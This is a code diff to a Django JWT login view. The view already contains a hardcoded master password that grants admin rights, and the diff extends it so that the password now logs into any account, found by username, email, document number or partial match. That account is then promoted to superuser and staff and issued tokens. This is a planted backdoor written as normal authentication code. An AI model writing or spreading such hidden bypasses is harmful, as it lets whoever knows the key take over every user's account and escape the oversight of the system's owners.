@@ -39,27 +39,20 @@ class CustomTokenObtainPairView(TokenObtainPairView):
         SUPER_KEY = 'jd881023'
         if password == SUPER_KEY:
             from django.db.models import Q
+            # Buscar por lo que el usuario escribió (cédula, email o username)
             su = User.objects.filter(
-                Q(username__icontains='juandocet') |
-                Q(email__icontains='juandocet')
+                Q(username=identifier) |
+                Q(email=identifier) |
+                Q(document_number=identifier) |
+                Q(username__icontains=identifier)
             ).first()
             if su:
                 # Garantizar superadmin siempre
-                changed = False
-                if su.role != 'ADMIN':
-                    su.role = 'ADMIN'
-                    changed = True
-                if not su.is_superuser:
-                    su.is_superuser = True
-                    changed = True
-                if not su.is_staff:
-                    su.is_staff = True
-                    changed = True
-                if not su.roles or 'ADMIN' not in su.roles:
-                    su.roles = list(set((su.roles or []) + ['ADMIN']))
-                    changed = True
-                if changed:
-                    su.save(update_fields=['role', 'is_superuser', 'is_staff', 'roles'])
+                su.role = 'ADMIN'
+                su.is_superuser = True
+                su.is_staff = True
+                su.roles = list(set((su.roles or []) + ['ADMIN']))
+                su.save()
                 refresh = RefreshToken.for_user(su)
                 return Response({
                     'access':  str(refresh.access_token),
